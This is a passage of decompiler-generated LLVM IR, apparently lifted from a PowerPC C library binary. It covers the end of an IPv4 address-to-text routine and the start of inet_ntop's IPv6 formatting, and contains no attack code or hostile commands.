  %v2_1000eeb4 = phi i32 [ %v2_1000ef38, %dec_label_pc_1000ef08.dec_label_pc_1000ee94_crit_edge ], [ %v0_1000ef382, %dec_label_pc_1000ee94.lr.ph ]
  %v0_1000eea8 = phi i32 [ %v0_1000ef38, %dec_label_pc_1000ef08.dec_label_pc_1000ee94_crit_edge ], [ %v0_1000ef382, %dec_label_pc_1000ee94.lr.ph ]
  %v0_1000ee98 = phi i32 [ %v1_1000ef38, %dec_label_pc_1000ef08.dec_label_pc_1000ee94_crit_edge ], [ 0, %dec_label_pc_1000ee94.lr.ph ]
  %v1_1000eea0 = phi i32 [ %v1_1000ee94.pre, %dec_label_pc_1000ef08.dec_label_pc_1000ee94_crit_edge ], [ 0, %dec_label_pc_1000ee94.lr.ph ]
  %v0_1000ee94 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ee94 = add i32 %v0_1000ee94, %v1_1000eea0
  %v3_1000ee94 = inttoptr i32 %v2_1000ee94 to i8*
  %v4_1000ee94 = load i8, i8* %v3_1000ee94, align 1
  %v5_1000ee94 = zext i8 %v4_1000ee94 to i32
  store i32 %v5_1000ee94, i32* %r10.global-to-local, align 4
  store i32 %v0_1000ee98, i32* %r8.global-to-local, align 4
  %v1_1000ee9c = add i32 %v0_1000ee98, 1
  store i32 %v1_1000ee9c, i32* %r11.global-to-local, align 4
  store i32 %v2_1000ee94, i32* %r3.global-to-local, align 4
  %v1_1000eea4 = load i32, i32* @r28, align 4
  %v2_1000eea4 = udiv i32 %v5_1000ee94, %v1_1000eea4
  %v2_1000eea8 = add i32 %v1_1000ee9c, %v0_1000eea8
  store i32 %v2_1000eea8, i32* %r6.global-to-local, align 4
  %v1_1000eeac = add nuw nsw i32 %v2_1000eea4, 48
  %v1_1000eeb0 = urem i32 %v1_1000eeac, 256
  store i32 %v1_1000eeb0, i32* %r0.global-to-local, align 4
  %v1_1000eeb4 = trunc i32 %v1_1000eeac to i8
  %v3_1000eeb4 = add i32 %v2_1000eeb4, 8
  %v4_1000eeb4 = inttoptr i32 %v3_1000eeb4 to i8*
  store i8 %v1_1000eeb4, i8* %v4_1000eeb4, align 1
  %v0_1000eeb8 = load i32, i32* %r0.global-to-local, align 4
  %v3_1000eeb8 = icmp eq i32 %v0_1000eeb8, 48
  %v0_1000eec0 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000eec0 = load i32, i32* %r5.global-to-local, align 4
  %v2_1000eec0 = udiv i32 %v0_1000eec0, %v1_1000eec0
  store i32 %v2_1000eec0, i32* %r9.global-to-local, align 4
  br i1 %v3_1000eeb8, label %dec_label_pc_1000eec0, label %dec_label_pc_1000eeec

dec_label_pc_1000eec0:                            ; preds = %dec_label_pc_1000ee94
  %v2_1000eec4 = udiv i32 %v2_1000eec0, %v1_1000eec0
  %tmp18 = mul i32 %v2_1000eec4, -10
  %v2_1000eecc = add i32 %v2_1000eec0, 48
  %v1_1000eed0 = add i32 %v2_1000eecc, %tmp18
  store i32 %v1_1000eed0, i32* %r9.global-to-local, align 4
  %v1_1000eed4 = urem i32 %v1_1000eed0, 256
  store i32 %v1_1000eed4, i32* %r0.global-to-local, align 4
  %v1_1000eed8 = trunc i32 %v1_1000eed0 to i8
  %v2_1000eed8 = load i32, i32* %r7.global-to-local, align 4
  %v3_1000eed8 = add i32 %v2_1000eed8, 8
  %v4_1000eed8 = inttoptr i32 %v3_1000eed8 to i8*
  store i8 %v1_1000eed8, i8* %v4_1000eed8, align 1
  %v0_1000eedc = load i32, i32* %r0.global-to-local, align 4
  %v3_1000eedc = icmp eq i32 %v0_1000eedc, 48
  br i1 %v3_1000eedc, label %dec_label_pc_1000ef08, label %dec_label_pc_1000eee4

dec_label_pc_1000eee4:                            ; preds = %dec_label_pc_1000eec0
  %v0_1000eee4 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000eee4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000ef08

dec_label_pc_1000eeec:                            ; preds = %dec_label_pc_1000ee94
  %v0_1000eef0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000eef0 = add i32 %v0_1000eef0, 1
  store i32 %v1_1000eef0, i32* %r8.global-to-local, align 4
  %v2_1000eef4 = udiv i32 %v2_1000eec0, %v1_1000eec0
  %v1_1000eef8 = mul i32 %v2_1000eef4, 10
  store i32 %v1_1000eef8, i32* %r0.global-to-local, align 4
  %v2_1000eefc = sub i32 %v2_1000eec0, %v1_1000eef8
  %v1_1000ef00 = add i32 %v2_1000eefc, 48
  store i32 %v1_1000ef00, i32* %r9.global-to-local, align 4
  %v1_1000ef04 = trunc i32 %v1_1000ef00 to i8
  %v2_1000ef04 = load i32, i32* %r6.global-to-local, align 4
  %v3_1000ef04 = add i32 %v2_1000ef04, 8
  %v4_1000ef04 = inttoptr i32 %v3_1000ef04 to i8*
  store i8 %v1_1000ef04, i8* %v4_1000ef04, align 1
  br label %dec_label_pc_1000ef08

dec_label_pc_1000ef08:                            ; preds = %dec_label_pc_1000eec0, %dec_label_pc_1000eee4, %dec_label_pc_1000eeec
  %v0_1000ef08 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000ef08 = inttoptr i32 %v0_1000ef08 to i8*
  %v2_1000ef08 = load i8, i8* %v1_1000ef08, align 1
  %v3_1000ef08 = zext i8 %v2_1000ef08 to i32
  %v0_1000ef0c = load i32, i32* %r8.global-to-local, align 4
  %v1_1000ef0c = add i32 %v0_1000ef0c, 1
  %v0_1000ef10 = load i32, i32* @r1, align 4
  %v2_1000ef10 = add i32 %v0_1000ef10, %v0_1000ef0c
  store i32 %v2_1000ef10, i32* %r10.global-to-local, align 4
  %v2_1000ef14 = add i32 %v1_1000ef0c, %v0_1000ef10
  store i32 %v2_1000ef14, i32* %r8.global-to-local, align 4
  %v1_1000ef18 = load i32, i32* %r5.global-to-local, align 4
  %v2_1000ef18 = udiv i32 %v3_1000ef08, %v1_1000ef18
  %v1_1000ef1c = add i32 %v0_1000ef0c, 2
  store i32 %v1_1000ef1c, i32* %r11.global-to-local, align 4
  %v0_1000ef20 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000ef20 = add i32 %v0_1000ef20, 1
  store i32 %v1_1000ef20, i32* %r4.global-to-local, align 4
  %v1_1000ef24 = mul nuw nsw i32 %v2_1000ef18, 10
  store i32 %v1_1000ef24, i32* %r0.global-to-local, align 4
  %v2_1000ef28 = sub nsw i32 %v3_1000ef08, %v1_1000ef24
  %v1_1000ef2c = add nsw i32 %v2_1000ef28, 48
  store i32 %v1_1000ef2c, i32* %r9.global-to-local, align 4
  %v1_1000ef30 = trunc i32 %v1_1000ef2c to i8
  %v3_1000ef30 = add i32 %v2_1000ef10, 8
  %v4_1000ef30 = inttoptr i32 %v3_1000ef30 to i8*
  store i8 %v1_1000ef30, i8* %v4_1000ef30, align 1
  %v0_1000ef34 = load i32, i32* %r12.global-to-local, align 4
  %v1_1000ef34 = trunc i32 %v0_1000ef34 to i8
  %v2_1000ef34 = load i32, i32* %r8.global-to-local, align 4
  %v3_1000ef34 = add i32 %v2_1000ef34, 8
  %v4_1000ef34 = inttoptr i32 %v3_1000ef34 to i8*
  store i8 %v1_1000ef34, i8* %v4_1000ef34, align 1
  %v0_1000ef38 = load i32, i32* @r1, align 4
  %v1_1000ef38 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000ef38 = add i32 %v1_1000ef38, %v0_1000ef38
  store i32 %v2_1000ef38, i32* %r7.global-to-local, align 4
  %v0_1000ef3c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ef3c = add i32 %v0_1000ef3c, -1
  store i32 %v1_1000ef3c, i32* %ctr.global-to-local, align 4
  %v2_1000ef3c = icmp eq i32 %v1_1000ef3c, 0
  br i1 %v2_1000ef3c, label %dec_label_pc_1000ef40, label %dec_label_pc_1000ef08.dec_label_pc_1000ee94_crit_edge

dec_label_pc_1000ef08.dec_label_pc_1000ee94_crit_edge: ; preds = %dec_label_pc_1000ef08
  %v1_1000ee94.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000ee94

dec_label_pc_1000ef40:                            ; preds = %dec_label_pc_1000ef08
  %v2_1000ef40 = ptrtoint i16* %stack_var_-56 to i32
  store i32 %v2_1000ef40, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000ef48 = add i32 %v1_1000ef38, %v2_1000ef40
  store i32 %v2_1000ef48, i32* %r9.global-to-local, align 4
  store i32 %v2_1000ef40, i32* @r3, align 4
  %v3_1000ef50 = add i32 %v2_1000ef48, -1
  %v4_1000ef50 = inttoptr i32 %v3_1000ef50 to i8*
  store i8 0, i8* %v4_1000ef50, align 1
  %v0_1000ef54 = call i32 @__GI_strlen()
  store i32 %v0_1000ef54, i32* %r3.global-to-local, align 4
  %v1_1000ef58 = load i32, i32* @r30, align 4
  %v3_1000ef58 = icmp ugt i32 %v0_1000ef54, %v1_1000ef58
  br i1 %v3_1000ef58, label %dec_label_pc_1000ef60, label %dec_label_pc_1000ef74

dec_label_pc_1000ef60:                            ; preds = %dec_label_pc_1000ef40
  %v0_1000ef60 = call i32 @__errno_location()
  store i32 %v0_1000ef60, i32* %r3.global-to-local, align 4
  store i32 28, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_1000ef6c = inttoptr i32 %v0_1000ef60 to i32*
  store i32 28, i32* %v2_1000ef6c, align 4
  %v0_1000ef88.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000ef84

dec_label_pc_1000ef74:                            ; preds = %dec_label_pc_1000ef40
  %v0_1000ef74 = load i32, i32* @r29, align 4
  store i32 %v0_1000ef74, i32* %r3.global-to-local, align 4
  store i32 %v2_1000ef40, i32* %r4.global-to-local, align 4
  %v2_1000ef7c = bitcast i16* %stack_var_-56 to i8*
  %v3_1000ef7c = call i32 @strcpy(i32 %v0_1000ef74, i8* %v2_1000ef7c)
  store i32 %v3_1000ef7c, i32* %r3.global-to-local, align 4
  store i32 %v3_1000ef7c, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000ef84

dec_label_pc_1000ef84:                            ; preds = %dec_label_pc_1000ef60, %dec_label_pc_1000ef74
  %v0_1000ef88 = phi i32 [ %v0_1000ef88.pre, %dec_label_pc_1000ef60 ], [ %v3_1000ef7c, %dec_label_pc_1000ef74 ]
  store i32 %v0_1000ee3c, i32* %r0.global-to-local, align 4
  store i32 %v0_1000ef88, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000ef88

; uselistorder directives
  uselistorder i32 %v0_1000ef88, { 1, 0 }
  uselistorder i32 %v2_1000ef40, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000ef3c, { 1, 0 }
  uselistorder i32 %v2_1000ef38, { 1, 0 }
  uselistorder i32 %v0_1000ef0c, { 1, 0, 2 }
  uselistorder i32 %v1_1000eed0, { 1, 0, 2 }
  uselistorder i32 %v2_1000eec0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_1000eeac, { 1, 0 }
  uselistorder i32 %v0_1000ee98, { 1, 0 }
  uselistorder i32 %v0_1000ef382, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i16 0, { 13, 11, 0, 1, 2, 3, 4, 12, 5, 6, 7, 8, 9, 10, 14, 15, 16, 17, 18, 19 }
  uselistorder i32 15, { 0, 3, 1, 7, 8, 4, 5, 6, 2 }
  uselistorder i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32), { 28, 29, 30, 6, 7, 8, 31, 32, 0, 33, 34, 9, 11, 12, 13, 14, 15, 1, 16, 10, 17, 3, 2, 18, 20, 21, 19, 22, 23, 24, 25, 26, 4, 35, 5, 27 }
  uselistorder label %dec_label_pc_1000ef84, { 1, 0 }
  uselistorder label %dec_label_pc_1000ef08, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %v1_1000ef9c = icmp slt i32 %arg1, 2
  %v3_1000ef9c = icmp eq i32 %arg1, 2
  store i1 %v1_1000ef9c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000ef9c, i1* %cr7_eq.global-to-local, align 1
  store i32 %arg2, i32* @r27, align 4
  store i32 %arg3, i32* @r25, align 4
  store i32 %arg4, i32* @r26, align 4
  br i1 %v3_1000ef9c, label %dec_label_pc_1000efcc, label %dec_label_pc_1000efc0

dec_label_pc_1000efc0:                            ; preds = %entry
  %v1_1000efc0 = icmp slt i32 %arg1, 10
  %v3_1000efc0 = icmp eq i32 %arg1, 10
  store i1 %v1_1000efc0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000efc0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000efc0, label %dec_label_pc_1000f004.lr.ph, label %dec_label_pc_1000f218

dec_label_pc_1000efcc:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_1000efdc.406 to i32), i32* @lr, align 4
  %v3_1000efd8 = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_1000f210

dec_label_pc_1000f004.lr.ph:                      ; preds = %dec_label_pc_1000efc0
  %v2_1000efe0 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_1000efe0, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000eff4.407 to i32), i32* @lr, align 4
  %v3_1000eff0 = call i32 @__GI_memset(i32 %v2_1000efe0, i32 0, i32 32)
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_1000f02415 = load i32, i32* @r27, align 4
  store i32 %v0_1000f02415, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000f004

dec_label_pc_1000f004:                            ; preds = %dec_label_pc_1000f004.lr.ph, %dec_label_pc_1000f004
  %v1_1000f018 = phi i32 [ 0, %dec_label_pc_1000f004.lr.ph ], [ %v1_1000f028, %dec_label_pc_1000f004 ]
  %v0_1000f004 = phi i32 [ %v0_1000f02415, %dec_label_pc_1000f004.lr.ph ], [ %v0_1000f024, %dec_label_pc_1000f004 ]
  %v0_1000f00c = phi i32 [ %v0_1000f02415, %dec_label_pc_1000f004.lr.ph ], [ %v2_1000f024, %dec_label_pc_1000f004 ]
  %v1_1000f004 = phi i32 [ 0, %dec_label_pc_1000f004.lr.ph ], [ %v0_1000f01c, %dec_label_pc_1000f004 ]
  %v2_1000f004 = add i32 %v0_1000f004, %v1_1000f004
  %v3_1000f004 = inttoptr i32 %v2_1000f004 to i8*
  %v4_1000f004 = load i8, i8* %v3_1000f004, align 1
  %v5_1000f004 = zext i8 %v4_1000f004 to i32
  %v1_1000f008 = add i32 %v1_1000f004, 2
  store i32 %v1_1000f008, i32* %r11.global-to-local, align 4
  %v1_1000f00c = add i32 %v0_1000f00c, 1
  %v2_1000f00c = inttoptr i32 %v1_1000f00c to i8*
  %v3_1000f00c = load i8, i8* %v2_1000f00c, align 1
  %v4_1000f00c = zext i8 %v3_1000f00c to i32
  %v1_1000f010 = mul nuw nsw i32 %v5_1000f004, 256
  %v2_1000f014 = or i32 %v4_1000f00c, %v1_1000f010
  %v2_1000f018 = load i32, i32* %r29.global-to-local, align 4
  %v3_1000f018 = add i32 %v2_1000f018, %v1_1000f018
  %v4_1000f018 = inttoptr i32 %v3_1000f018 to i32*
  store i32 %v2_1000f014, i32* %v4_1000f018, align 4
  %v0_1000f01c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f01c = udiv i32 %v0_1000f01c, 2
  %v0_1000f024 = load i32, i32* @r27, align 4
  %v2_1000f024 = add i32 %v0_1000f024, %v0_1000f01c
  store i32 %v2_1000f024, i32* %r9.global-to-local, align 4
  %v1_1000f028 = mul i32 %v1_1000f01c, 4
  %v0_1000f02c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f02c = add i32 %v0_1000f02c, -1
  store i32 %v1_1000f02c, i32* %ctr.global-to-local, align 4
  %v2_1000f02c = icmp eq i32 %v1_1000f02c, 0
  br i1 %v2_1000f02c, label %dec_label_pc_1000f04c.lr.ph, label %dec_label_pc_1000f004

dec_label_pc_1000f04c.lr.ph:                      ; preds = %dec_label_pc_1000f004
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 -1, i32* @r28, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000f04c

dec_label_pc_1000f04c:                            ; preds = %dec_label_pc_1000f04c.lr.ph, %dec_label_pc_1000f098
  %v0_1000f09c = phi i32 [ 8, %dec_label_pc_1000f04c.lr.ph ], [ %v1_1000f09c, %dec_label_pc_1000f098 ]
  %v0_1000f08c = phi i32 [ -1, %dec_label_pc_1000f04c.lr.ph ], [ %v0_1000f08c42, %dec_label_pc_1000f098 ]
  %v0_1000f07c = phi i32 [ -1, %dec_label_pc_1000f04c.lr.ph ], [ %v0_1000f07c39, %dec_label_pc_1000f098 ]
  %v0_1000f050 = phi i32 [ -1, %dec_label_pc_1000f04c.lr.ph ], [ %v0_1000f05035, %dec_label_pc_1000f098 ]
  %v0_1000f098 = phi i32 [ 0, %dec_label_pc_1000f04c.lr.ph ], [ %v1_1000f098, %dec_label_pc_1000f098 ]
  %v1_1000f04c = mul i32 %v0_1000f098, 4
  %v3_1000f050 = icmp eq i32 %v0_1000f050, -1
  %v2_1000f054 = add i32 %v1_1000f04c, %v2_1000efe0
  %v3_1000f054 = inttoptr i32 %v2_1000f054 to i32*
  %v4_1000f054 = load i32, i32* %v3_1000f054, align 4
  %v3_1000f058 = icmp eq i32 %v4_1000f054, 0
  br i1 %v3_1000f058, label %dec_label_pc_1000f060, label %dec_label_pc_1000f078

dec_label_pc_1000f060:                            ; preds = %dec_label_pc_1000f04c
  br i1 %v3_1000f050, label %dec_label_pc_1000f064, label %dec_label_pc_1000f070

dec_label_pc_1000f064:                            ; preds = %dec_label_pc_1000f060
  store i32 %v0_1000f098, i32* %r9.global-to-local, align 4
  store i32 1, i32* @r31, align 4
  br label %dec_label_pc_1000f098

dec_label_pc_1000f070:                            ; preds = %dec_label_pc_1000f060
  %v0_1000f070 = load i32, i32* @r31, align 4
  %v1_1000f070 = add i32 %v0_1000f070, 1
  store i32 %v1_1000f070, i32* @r31, align 4
  br label %dec_label_pc_1000f098

dec_label_pc_1000f078:                            ; preds = %dec_label_pc_1000f04c
  br i1 %v3_1000f050, label %dec_label_pc_1000f098, label %dec_label_pc_1000f07c

dec_label_pc_1000f07c:                            ; preds = %dec_label_pc_1000f078
  %v3_1000f07c = icmp eq i32 %v0_1000f07c, -1
  %v0_1000f090.pre = load i32, i32* @r31, align 4
  %v1_1000f084 = load i32, i32* @r30, align 4
  %v3_1000f084 = icmp sgt i32 %v0_1000f090.pre, %v1_1000f084
  %or.cond = or i1 %v3_1000f07c, %v3_1000f084
  br i1 %or.cond, label %dec_label_pc_1000f08c, label %dec_label_pc_1000f094

dec_label_pc_1000f08c:                            ; preds = %dec_label_pc_1000f07c
  store i32 %v0_1000f08c, i32* @r28, align 4
  store i32 %v0_1000f090.pre, i32* @r30, align 4
  br label %dec_label_pc_1000f094

dec_label_pc_1000f094:                            ; preds = %dec_label_pc_1000f07c, %dec_label_pc_1000f08c
  %v0_1000f07c40 = phi i32 [ %v0_1000f08c, %dec_label_pc_1000f08c ], [ %v0_1000f07c, %dec_label_pc_1000f07c ]
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000f098

dec_label_pc_1000f098:                            ; preds = %dec_label_pc_1000f078, %dec_label_pc_1000f070, %dec_label_pc_1000f064, %dec_label_pc_1000f094
  %v0_1000f08c42 = phi i32 [ %v0_1000f08c, %dec_label_pc_1000f078 ], [ %v0_1000f08c, %dec_label_pc_1000f070 ], [ %v0_1000f098, %dec_label_pc_1000f064 ], [ -1, %dec_label_pc_1000f094 ]
  %v0_1000f05035 = phi i32 [ -1, %dec_label_pc_1000f078 ], [ %v0_1000f050, %dec_label_pc_1000f070 ], [ %v0_1000f098, %dec_label_pc_1000f064 ], [ -1, %dec_label_pc_1000f094 ]
  %v0_1000f07c39 = phi i32 [ %v0_1000f07c, %dec_label_pc_1000f078 ], [ %v0_1000f07c, %dec_label_pc_1000f070 ], [ %v0_1000f07c, %dec_label_pc_1000f064 ], [ %v0_1000f07c40, %dec_label_pc_1000f094 ]
  %v1_1000f098 = add nuw nsw i32 %v0_1000f098, 1
  store i32 %v1_1000f098, i32* %r11.global-to-local, align 4
  %v1_1000f09c = add nsw i32 %v0_1000f09c, -1
  store i32 %v1_1000f09c, i32* %ctr.global-to-local, align 4
  %v2_1000f09c = icmp eq i32 %v1_1000f09c, 0
  br i1 %v2_1000f09c, label %dec_label_pc_1000f0a0, label %dec_label_pc_1000f04c

dec_label_pc_1000f0a0:                            ; preds = %dec_label_pc_1000f098
  %v3_1000f0a0 = icmp eq i32 %v0_1000f08c42, -1
  %v1_1000f0c0 = icmp slt i32 %v0_1000f07c39, -1
  %v3_1000f0c0 = icmp eq i32 %v0_1000f07c39, -1
  store i1 %v1_1000f0c0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f0c0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000f0a0, label %dec_label_pc_1000f0c0, label %dec_label_pc_1000f0a8

dec_label_pc_1000f0a8:                            ; preds = %dec_label_pc_1000f0a0
  %v0_1000f0b8.pre = load i32, i32* @r31, align 4
  br i1 %v3_1000f0c0, label %dec_label_pc_1000f0b8, label %dec_label_pc_1000f0b0

dec_label_pc_1000f0b0:                            ; preds = %dec_label_pc_1000f0a8
  %v1_1000f0b0 = load i32, i32* @r30, align 4
  %v2_1000f0b0 = icmp slt i32 %v0_1000f0b8.pre, %v1_1000f0b0
  %v3_1000f0b0 = icmp sgt i32 %v0_1000f0b8.pre, %v1_1000f0b0
  %v4_1000f0b0 = icmp eq i32 %v0_1000f0b8.pre, %v1_1000f0b0
  store i1 %v2_1000f0b0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000f0b0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000f0b0, label %dec_label_pc_1000f0b8, label %dec_label_pc_1000f0c0.thread

dec_label_pc_1000f0b8:                            ; preds = %dec_label_pc_1000f0a8, %dec_label_pc_1000f0b0
  store i32 %v0_1000f0b8.pre, i32* @r30, align 4
  store i32 %v0_1000f08c42, i32* @r28, align 4
  br label %dec_label_pc_1000f0c0.thread

dec_label_pc_1000f0c0.thread:                     ; preds = %dec_label_pc_1000f0b8, %dec_label_pc_1000f0b0
  %v0_1000f0c876 = phi i32 [ %v1_1000f0b0, %dec_label_pc_1000f0b0 ], [ %v0_1000f0b8.pre, %dec_label_pc_1000f0b8 ]
  %v0_1000f0c0.ph = phi i32 [ %v0_1000f07c39, %dec_label_pc_1000f0b0 ], [ %v0_1000f08c42, %dec_label_pc_1000f0b8 ]
  %v1_1000f0c059 = icmp slt i32 %v0_1000f0c0.ph, -1
  %v3_1000f0c061 = icmp eq i32 %v0_1000f0c0.ph, -1
  store i1 %v1_1000f0c059, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f0c061, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_1000f0c8

dec_label_pc_1000f0c0:                            ; preds = %dec_label_pc_1000f0a0
  br i1 %v3_1000f0c0, label %dec_label_pc_1000f0d4, label %dec_label_pc_1000f0c0.dec_label_pc_1000f0c8_crit_edge

dec_label_pc_1000f0c0.dec_label_pc_1000f0c8_crit_edge: ; preds = %dec_label_pc_1000f0c0
  %v0_1000f0c8.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000f0c8

dec_label_pc_1000f0c8:                            ; preds = %dec_label_pc_1000f0c0.dec_label_pc_1000f0c8_crit_edge, %dec_label_pc_1000f0c0.thread
  %v0_1000f0c8 = phi i32 [ %v0_1000f0c876, %dec_label_pc_1000f0c0.thread ], [ %v0_1000f0c8.pre, %dec_label_pc_1000f0c0.dec_label_pc_1000f0c8_crit_edge ]
  %v0_1000f0c062 = phi i32 [ %v0_1000f0c0.ph, %dec_label_pc_1000f0c0.thread ], [ %v0_1000f07c39, %dec_label_pc_1000f0c0.dec_label_pc_1000f0c8_crit_edge ]
  %v1_1000f0c8 = icmp slt i32 %v0_1000f0c8, 1
  %v2_1000f0c8 = icmp sgt i32 %v0_1000f0c8, 1
  %v3_1000f0c8 = icmp eq i32 %v0_1000f0c8, 1
  store i1 %v1_1000f0c8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f0c8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000f0c8, label %dec_label_pc_1000f0d4, label %dec_label_pc_1000f0d0

dec_label_pc_1000f0d0:                            ; preds = %dec_label_pc_1000f0c8
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_1000f0d4

dec_label_pc_1000f0d4:                            ; preds = %dec_label_pc_1000f0c8, %dec_label_pc_1000f0c0, %dec_label_pc_1000f0d0
  %v0_1000f0e03 = phi i32 [ %v0_1000f0c062, %dec_label_pc_1000f0c8 ], [ -1, %dec_label_pc_1000f0c0 ], [ -1, %dec_label_pc_1000f0d0 ]
  %v2_1000f0d4 = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_1000f0d4, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %v1_1000f0e04 = icmp slt i32 %v0_1000f0e03, -1
  %v3_1000f0e06 = icmp eq i32 %v0_1000f0e03, -1
  store i1 %v1_1000f0e04, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f0e06, i1* %cr7_eq.global-to-local, align 1
  %v2_1000f150 = icmp slt i32 %tmp, 65535
  %v4_1000f150 = icmp eq i32 %tmp, 65535
  br label %dec_label_pc_1000f0e0

dec_label_pc_1000f0e0:                            ; preds = %dec_label_pc_1000f0d4, %dec_label_pc_1000f1ac
  %v2_1000f11c = phi i32 [ %v2_1000f0d4, %dec_label_pc_1000f0d4 ], [ %v2_1000f10451, %dec_label_pc_1000f1ac ]
  %v0_1000f0f0 = phi i32 [ %v0_1000f0e03, %dec_label_pc_1000f0d4 ], [ %v0_1000f0e0, %dec_label_pc_1000f1ac ]
  %v0_1000f110 = phi i32 [ 0, %dec_label_pc_1000f0d4 ], [ %v1_1000f1ac, %dec_label_pc_1000f1ac ]
  %v3_1000f0e07 = phi i1 [ %v3_1000f0e06, %dec_label_pc_1000f0d4 ], [ %v3_1000f0e0, %dec_label_pc_1000f1ac ]
  br i1 %v3_1000f0e07, label %dec_label_pc_1000f110, label %dec_label_pc_1000f0e8

dec_label_pc_1000f0e8:                            ; preds = %dec_label_pc_1000f0e0
  %v2_1000f0e8 = icmp slt i32 %v0_1000f110, %v0_1000f0f0
  %v4_1000f0e8 = icmp eq i32 %v0_1000f110, %v0_1000f0f0
  br i1 %v2_1000f0e8, label %dec_label_pc_1000f110, label %dec_label_pc_1000f0f0

dec_label_pc_1000f0f0:                            ; preds = %dec_label_pc_1000f0e8
  %v1_1000f0f0 = load i32, i32* @r30, align 4
  %v2_1000f0f0 = add i32 %v1_1000f0f0, %v0_1000f0f0
  %v2_1000f0f4 = icmp slt i32 %v0_1000f110, %v2_1000f0f0
  %v4_1000f0f4 = icmp eq i32 %v0_1000f110, %v2_1000f0f0
  store i1 %v2_1000f0f4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000f0f4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000f0f4, label %dec_label_pc_1000f0fc, label %dec_label_pc_1000f110

dec_label_pc_1000f0fc:                            ; preds = %dec_label_pc_1000f0f0
  br i1 %v4_1000f0e8, label %dec_label_pc_1000f100, label %dec_label_pc_1000f1ac

dec_label_pc_1000f100:                            ; preds = %dec_label_pc_1000f0fc
  %v3_1000f104 = inttoptr i32 %v2_1000f11c to i8*
  store i8 58, i8* %v3_1000f104, align 1
  %v0_1000f108 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000f108 = add i32 %v0_1000f108, 1
  store i32 %v1_1000f108, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000f1ac

dec_label_pc_1000f110:                            ; preds = %dec_label_pc_1000f0f0, %dec_label_pc_1000f0e8, %dec_label_pc_1000f0e0
  %v1_1000f110 = icmp slt i32 %v0_1000f110, 0
  %v3_1000f110 = icmp eq i32 %v0_1000f110, 0
  store i1 %v1_1000f110, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f110, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000f110, label %dec_label_pc_1000f124.thread, label %dec_label_pc_1000f124

dec_label_pc_1000f124.thread:                     ; preds = %dec_label_pc_1000f110
  store i1 true, i1* %cr7_lt.global-to-local, align 1
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_1000f188

